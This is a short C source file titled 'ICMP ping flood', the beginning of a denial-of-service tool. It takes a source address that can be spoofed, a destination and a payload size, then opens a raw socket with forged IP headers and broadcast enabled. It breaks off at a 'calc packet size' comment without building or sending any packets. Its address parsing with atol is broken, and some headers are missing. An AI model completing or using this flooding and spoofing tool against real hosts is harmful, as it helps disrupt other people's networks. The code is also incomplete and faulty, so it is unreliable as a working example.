/**
 * ICMP ping flood
 *
 * Written By Josh Harshman
 * All Rights Reserved 12.10.2013
 **/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>

void usage( void );
//= = = = = = = = = = = = = = = = = = = = = = = = = = =

void usage( void ) {
  printf("Usage:\n");
  printf(" -s source address\n");
  printf(" -d destination address\n");
  printf(" -p payload size\n");
  exit (8);

}
int main(int argc, char *argv[]) {

  unsigned long dest;
  unsigned long source;
  int load_size, sent, sent_size;

  //argument parsing
  if(argc < 3)
    usage();

  int i;
  for(i = 0; i < argc; i ++) {
    if(strncmp(argv[i], "-s", 2) == 0) {
      source = atol(argv[i+1]);
    }
    if(strncmp(argv[i], "-d", 2) == 0) {
      dest = atol(argv[i+1]);
    }
    if(strncmp(argv[i], "-p", 2) == 0) {
      load_size = atoi(argv[i+1]);
    }
  }
  //end arg parsing

  //establish raw socket
  int lsocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(lsocket < 0) {
    puts("Error, could not create socket");
    return 0;
  }

  int on = 1;

  //provide ip header information
  if( setsockopt (lsocket, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) < 0 ) {
    perror("setsockopt error"); //prints error message to stderr
    return 0;
  }

  //allow packets to send datagrams
  if( setsockopt(lsocket, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) < 0 ) {
    perror("setsockopt error");
    return 0;
  }

  //calc packet size

}
